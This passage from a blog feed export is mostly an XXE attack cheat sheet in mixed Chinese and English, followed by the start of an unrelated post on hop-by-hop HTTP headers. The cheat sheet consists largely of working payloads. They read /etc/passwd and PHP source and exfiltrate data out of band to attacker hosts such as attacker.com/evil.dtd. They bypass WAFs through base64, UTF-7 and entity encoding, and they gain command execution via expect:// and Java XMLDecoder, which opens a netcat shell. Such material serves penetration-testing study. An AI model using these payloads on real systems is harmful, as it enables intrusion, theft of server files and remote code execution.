<h3 id="PDF-File-upload"><a href="#PDF-File-upload" class="headerlink" title="PDF - File upload"></a><strong>PDF - File upload</strong></h3><p>Read the following post to <strong>learn how to exploit a XXE uploading a PDF</strong> file:</p>
<p>content-ref url&#x3D;”file-upload&#x2F;pdf-upload-xxe-and-cors-bypass.md”<br><a href="file-upload/pdf-upload-xxe-and-cors-bypass.md">pdf-upload-xxe-and-cors-bypass.md</a><br>endcontent-ref </p>
<h3 id="Content-Type-From-x-www-urlencoded-to-XML"><a href="#Content-Type-From-x-www-urlencoded-to-XML" class="headerlink" title="Content-Type: From x-www-urlencoded to XML"></a>Content-Type: From x-www-urlencoded to XML</h3><p>如果 POST 请求接受 XML 格式的数据，您可以尝试在该请求中利用 XXE。例如，如果一个正常的请求包含以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>

<p>Then you might be able submit the following request, with the same result:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Content-Type-From-JSON-to-XEE"><a href="#Content-Type-From-JSON-to-XEE" class="headerlink" title="Content-Type: From JSON to XEE"></a>Content-Type: From JSON to XEE</h3><p>To change the request you could use a Burp Extension named “<strong>Content Type Converter</strong>“. <a href="https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html">Here</a> you can find this example:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&#123;&quot;root&quot;: &#123;&quot;root&quot;: &#123;</span><br><span class="line">  &quot;firstName&quot;: &quot;Avinash&quot;,</span><br><span class="line">  &quot;lastName&quot;: &quot;&quot;,</span><br><span class="line">  &quot;country&quot;: &quot;United States&quot;,</span><br><span class="line">  &quot;city&quot;: &quot;ddd&quot;,</span><br><span class="line">  &quot;postalCode&quot;: &quot;ddd&quot;</span><br><span class="line">&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/xml;charset=UTF-8</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE testingxxe [&lt;!ENTITY xxe SYSTEM &quot;http://34.229.92.127:8000/TEST.ext&quot; &gt;]&gt; </span><br><span class="line">&lt;root&gt;</span><br><span class="line"> &lt;root&gt;</span><br><span class="line">  &lt;firstName&gt;&amp;xxe;&lt;/firstName&gt;</span><br><span class="line">  &lt;lastName/&gt;</span><br><span class="line">  &lt;country&gt;United States&lt;/country&gt;</span><br><span class="line">  &lt;city&gt;ddd&lt;/city&gt;</span><br><span class="line">  &lt;postalCode&gt;ddd&lt;/postalCode&gt;</span><br><span class="line"> &lt;/root&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>

<p>Another example can be found <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">here</a>.</p>
<h2 id="WAF-amp-Protections-Bypasses"><a href="#WAF-amp-Protections-Bypasses" class="headerlink" title="WAF &amp; Protections Bypasses"></a>WAF &amp; Protections Bypasses</h2><h3 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo/&gt;</span><br></pre></td></tr></table></figure>

<p>This only work if the XML server accepts the <code>data://</code> protocol.</p>
<h3 id="UTF-7"><a href="#UTF-7" class="headerlink" title="UTF-7"></a>UTF-7</h3><p>You can use the [<strong>“Encode Recipe</strong>“ of cyberchef here ]([<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7">https://gchq.github.io/CyberChef/#recipe=Encode_text%28’UTF-7</a> %2865000%29’%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to](<a href="https://gchq.github.io/CyberChef/#recipe=Encode_text%28%27UTF-7%20%2865000%29%27%29&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to">https://gchq.github.io/CyberChef/#recipe=Encode_text%28’UTF-7 %2865000%29’%29&amp;input&#x3D;PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to</a>) transform to UTF-7.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?--&gt;</span><br><span class="line">+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+</span><br><span class="line">+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4</span><br></pre></td></tr></table></figure>

<h3 id="File-x2F-Protocol-Bypass"><a href="#File-x2F-Protocol-Bypass" class="headerlink" title="File:&#x2F; Protocol Bypass"></a>File:&#x2F; Protocol Bypass</h3><p>If the web is using PHP, instead of using <code>file:/</code> you can use <strong>php wrappers</strong><code>php://filter/convert.base64-encode/resource=</code> to <strong>access internal files</strong>.</p>
<p>If the web is using Java you may check the <a href="xxe-xee-xml-external-entity.md#jar-protocol"><strong>jar: protocol</strong></a>.</p>
<h3 id="HTML-Entities"><a href="#HTML-Entities" class="headerlink" title="HTML Entities"></a>HTML Entities</h3><p>Trick from <a href="https://github.com/Ambrotd/XXE-Notes"><strong>https://github.com/Ambrotd/XXE-Notes</strong></a><br>You can create an <strong>entity inside an entity</strong> encoding it with <strong>html entities</strong> and then call it to <strong>load a dtd</strong>.<br>Note that the <strong>HTML Entities</strong> used needs to be <strong>numeric</strong> (like [in this example](<a href="https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,%27Numeric%20entities%27%29&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)%5C">https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity%28true,’Numeric entities’%29&amp;input&#x3D;PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\</a>).</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY % a &quot;&amp;#x3C;&amp;#x21;&amp;#x45;&amp;#x4E;&amp;#x54;&amp;#x49;&amp;#x54;&amp;#x59;&amp;#x20;&amp;#x25;&amp;#x20;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x20;&amp;#x53;&amp;#x59;&amp;#x53;&amp;#x54;&amp;#x45;&amp;#x4D;&amp;#x20;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x6F;&amp;#x75;&amp;#x72;&amp;#x73;&amp;#x65;&amp;#x72;&amp;#x76;&amp;#x65;&amp;#x72;&amp;#x2E;&amp;#x63;&amp;#x6F;&amp;#x6D;&amp;#x2F;&amp;#x62;&amp;#x79;&amp;#x70;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#x2E;&amp;#x64;&amp;#x74;&amp;#x64;&amp;#x22;&amp;#x20;&amp;#x3E;&quot; &gt;%a;%dtd;]&gt;</span><br><span class="line">&lt;data&gt;</span><br><span class="line">    &lt;env&gt;&amp;exfil;&lt;/env&gt;</span><br><span class="line">&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>DTD example:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % abt &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://172.17.0.1:7878/bypass.xml?%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%abt;</span><br><span class="line">%exfil;</span><br></pre></td></tr></table></figure>

<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><h3 id="Base64-1"><a href="#Base64-1" class="headerlink" title="Base64"></a>Base64</h3><p><strong>Extract</strong> <em><strong>index.php</strong></em></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h4 id="Extract-external-resource"><a href="#Extract-external-resource" class="headerlink" title="Extract external resource"></a><strong>Extract external resource</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=http://10.0.0.3&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Remote-code-execution"><a href="#Remote-code-execution" class="headerlink" title="Remote code execution"></a>Remote code execution</h3><p><strong>If PHP “expect” module is loaded</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SOAP-XEE"><a href="#SOAP-XEE" class="headerlink" title="SOAP - XEE"></a><strong>SOAP - XEE</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://x.x.x.x:22/&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;</span><br></pre></td></tr></table></figure>

<h2 id="XLIFF-XXE"><a href="#XLIFF-XXE" class="headerlink" title="XLIFF - XXE"></a>XLIFF - XXE</h2><p>This section was taken from <a href="https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe">https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe</a><br>According to the <a href="https://en.wikipedia.org/wiki/XLIFF">Wikipedia</a>:</p>
<blockquote>
<p>XLIFF (XML Localization Interchange File Format) is an XML-based bitext format created to standardize the way localizable data are passed between and among tools during a localization process and a common format for CAT tool exchange.</p>
</blockquote>
<h3 id="Blind-request"><a href="#Blind-request" class="headerlink" title="Blind request"></a>Blind request</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://redacted.burpcollaborator.net/?xxe_test&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>The server response with an error:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed.&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>But we got a hit on Burp Collaborator.</p>
<h3 id="Exfiltrating-Data-via-Out-of-Band"><a href="#Exfiltrating-Data-via-Out-of-Band" class="headerlink" title="Exfiltrating Data via Out of Band"></a>Exfiltrating Data via Out of Band</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;xxe.xliff&quot;</span><br><span class="line">Content-Type: application/x-xliff+xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE XXE [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://attacker.com/evil.dtd&quot;&gt; %remote; ]&gt;</span><br><span class="line">&lt;xliff srcLang=&quot;en&quot; trgLang=&quot;ms-MY&quot; version=&quot;2.0&quot;&gt;&lt;/xliff&gt;</span><br><span class="line">------WebKitFormBoundaryqBdAsEtYaBjTArl3--</span><br></pre></td></tr></table></figure>

<p>Based on the displayed User Agent returned by burp collaborator, it appears that it is using <strong>Java 1.8</strong>. One of the problems when exploiting XXE on this version of Java is <strong>we’re unable to obtain the files containing a <code>New Line</code></strong> such as <code>/etc/passwd</code> using the Out of Band technique.</p>
<h3 id="Exfiltrating-Data-via-Error-Based"><a href="#Exfiltrating-Data-via-Error-Based" class="headerlink" title="Exfiltrating Data via Error Based"></a>Exfiltrating Data via Error Based</h3><p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>Server Response:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">&quot;status&quot;</span>:<span class="number">500</span>,<span class="string">&quot;error&quot;</span>:<span class="string">&quot;Internal Server Error&quot;</span>,<span class="string">&quot;message&quot;</span>:<span class="string">&quot;IO error.\nReason: /nofile (No such file or directory)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Great! The <code>non-exist</code> file is reflected in the Error messages. Next is adding the File Content.</p>
<p>DTD File:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % foo &quot;&lt;!ENTITY &amp;#37; xxe SYSTEM &#x27;file:///nofile/%data;&#x27;&gt;&quot;&gt;</span><br><span class="line">%foo;</span><br><span class="line">%xxe;</span><br></pre></td></tr></table></figure>

<p>And the content of the file was successfully <strong>printed in the output of the error sent via HTTP</strong>.</p>
<h2 id="RSS-XEE"><a href="#RSS-XEE" class="headerlink" title="RSS - XEE"></a>RSS - XEE</h2><p>具有 RSS 格式的有效 XML 以利用 XXE 漏洞。</p>
<h3 id="Ping-back"><a href="#Ping-back" class="headerlink" title="Ping back"></a>Ping back</h3><p>Simple HTTP request to attackers server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://&lt;AttackIP&gt;/rssXXE&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;XXE Test Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;XXE Test Blog&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;Test Post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 02 Feb 2015 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-file"><a href="#Read-file" class="headerlink" title="Read file"></a>Read file</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Read-source-code"><a href="#Read-source-code" class="headerlink" title="Read source code"></a>Read source code</h3><p>Using PHP base64 filter</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE title [ &lt;!ELEMENT title ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php&quot; &gt;]&gt;</span><br><span class="line">&lt;rss version=&quot;2.0&quot; xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;&gt;</span><br><span class="line">&lt;channel&gt;</span><br><span class="line">&lt;title&gt;The Blog&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com/&lt;/link&gt;</span><br><span class="line">&lt;description&gt;A blog about things&lt;/description&gt;</span><br><span class="line">&lt;lastBuildDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/lastBuildDate&gt;</span><br><span class="line">&lt;item&gt;</span><br><span class="line">&lt;title&gt;&amp;xxe;&lt;/title&gt;</span><br><span class="line">&lt;link&gt;http://example.com&lt;/link&gt;</span><br><span class="line">&lt;description&gt;a post&lt;/description&gt;</span><br><span class="line">&lt;author&gt;author@example.com&lt;/author&gt;</span><br><span class="line">&lt;pubDate&gt;Mon, 03 Feb 2014 00:00:00 -0000&lt;/pubDate&gt;</span><br><span class="line">&lt;/item&gt;</span><br><span class="line">&lt;/channel&gt;</span><br><span class="line">&lt;/rss&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Java-XMLDecoder-XEE-to-RCE"><a href="#Java-XMLDecoder-XEE-to-RCE" class="headerlink" title="Java XMLDecoder XEE to RCE"></a>Java XMLDecoder XEE to RCE</h2><p>XMLDecoder 是一个基于 XML 消息创建对象的 Java 类。如果恶意用户可以在调用<strong>readObject</strong>方法时让应用程序使用任意数据，将可在服务器上的代码执行。</p>
<h3 id="Using-Runtime-exec"><a href="#Using-Runtime-exec" class="headerlink" title="Using Runtime().exec()"></a>Using Runtime().exec()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line"> &lt;object class=&quot;java.lang.Runtime&quot; method=&quot;getRuntime&quot;&gt;</span><br><span class="line">      &lt;void method=&quot;exec&quot;&gt;</span><br><span class="line">      &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">          &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">              &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">              &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">              &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">              &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">              &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">          &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">              &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">          &lt;/void&gt;</span><br><span class="line">      &lt;/array&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line"> &lt;/object&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;java version=&quot;1.7.0_21&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">    &lt;array class=&quot;java.lang.String&quot; length=&quot;6&quot;&gt;</span><br><span class="line">      &lt;void index=&quot;0&quot;&gt;</span><br><span class="line">        &lt;string&gt;/usr/bin/nc&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;1&quot;&gt;</span><br><span class="line">         &lt;string&gt;-l&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;2&quot;&gt;</span><br><span class="line">         &lt;string&gt;-p&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;3&quot;&gt;</span><br><span class="line">         &lt;string&gt;9999&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;4&quot;&gt;</span><br><span class="line">         &lt;string&gt;-e&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">      &lt;void index=&quot;5&quot;&gt;</span><br><span class="line">         &lt;string&gt;/bin/sh&lt;/string&gt;</span><br><span class="line">      &lt;/void&gt;</span><br><span class="line">    &lt;/array&gt;</span><br><span class="line">    &lt;void method=&quot;start&quot; id=&quot;process&quot;&gt;</span><br><span class="line">    &lt;/void&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>embed url&#x3D;”<a href="https://github.com/luisfontes19/xxexploiter&quot;">https://github.com/luisfontes19/xxexploiter&quot;</a> </p>
<h2 id="More-resources"><a href="#More-resources" class="headerlink" title="More resources"></a>More resources</h2><p><a href="https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf">https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf</a><br><a href="https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html">https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html</a><br>Extract info via HTTP using own external DTD: <a href="https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/">https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection</a><br><a href="https://gist.github.com/staaldraad/01415b990939494879b4">https://gist.github.com/staaldraad/01415b990939494879b4</a><br><a href="https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9">https:&#x2F;&#x2F;medium.com&#x2F;@onehackman&#x2F;exploiting-xml-external-entity-xxe-injections-b0e3eac388f9</a><br><a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a><br><a href="https://gosecure.github.io/xxe-workshop/#7">https://gosecure.github.io/xxe-workshop/#7</a></p>
]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title>hop-by-hop相关安全知识点</title>
    <url>/2022/07/15/hop-by-hop%E7%9B%B8%E5%85%B3%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h1 id="hop-by-hop-标头相关知识"><a href="#hop-by-hop-标头相关知识" class="headerlink" title="hop-by-hop 标头相关知识"></a>hop-by-hop 标头相关知识</h1><h2 id="乜叉係-hop-by-hop？"><a href="#乜叉係-hop-by-hop？" class="headerlink" title="乜叉係 hop-by-hop？"></a>乜叉係 hop-by-hop？</h2><p>先解释下这是什么东西。根据 <a href="https://datatracker.ietf.org/doc/html/rfc2616#section-13.5.1">RFC 2612</a>，HTTP&#x2F;1.1 规范默认将以下标头视为 hop-by-hop ：<code>Keep-Alive</code>、<code>Transfer-Encoding</code>、<code>TE</code>、<code>Connection</code>、<code>Trailer</code>、<code>Upgrade</code>、<code>Proxy-Authorization</code> 和 <code>Proxy-Authenticate</code>。当在请求中遇到这些标头时，代理服务器会处理这些标头，并且不会将其转发到下一个节点。<br>除了这些默认值之外，用户还可以自定义逐跳标头，<a href="https://datatracker.ietf.org/doc/html/rfc2616#section-14.10">只需要将标头的 key 添加到 <code>Connection</code> 标头的 value 中，即可被视为逐跳标头</a>，如下所示：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">Connection：close, X-Foo, X-Bar</span><br></pre></td></tr></table></figure>
